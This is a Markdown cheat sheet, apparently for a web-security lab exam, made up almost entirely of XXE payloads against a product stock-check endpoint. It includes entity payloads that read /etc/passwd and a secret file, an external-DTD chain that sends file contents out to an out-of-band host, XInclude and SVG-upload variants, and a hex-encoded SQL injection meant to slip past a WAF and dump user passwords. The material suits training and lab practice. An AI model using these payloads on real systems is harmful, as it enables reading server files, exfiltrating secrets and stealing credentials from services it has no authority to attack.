## 🎯 Target Location

**Primary Target:** Product Stock Check (`/product/stock`) ⭐⭐⭐

## 🔍 Detection

**IMPORTANT:** Scan the ENTIRE request, not just targeted scan!

### Stock Check Request Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

## 🔥 Basic XXE Payloads

### File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Read Target File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

## 🛡️ Advanced XXE Techniques

### Blind XXE with Out-of-Band Interaction
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://burp.oastify.com"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Blind XXE Data Exfiltration via External DTD

**Step 1:** Host malicious DTD on exploit server (`/exploit.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://burp.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

**Step 2:** Trigger from XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-server.com/exploit.dtd"> %xxe;]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### XInclude Attack
**Scenario:** Can't modify DOCTYPE (only control data)

```xml
<stockCheck>
  <productId xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///home/carlos/secret"/>
  </productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### XXE via File Upload
**Scenario:** Image upload processes SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/carlos/secret"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## 🛠️ Tools & Extensions

### Hackvertor (Burp Extension)
**Use for XML encoding to bypass WAF:**

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

## 🎓 Exam Tips

1. **Scan entire stock check request** - Not just targeted scan
2. **Use Burp Scanner** - Detects XXE automatically
3. **Adapt Burp's payload** - Scanner gives you starting point
4. **Use HackTricks** - Comprehensive XXE payloads
5. **Use Hackvertor for encoding** - Bypass WAF filters

---
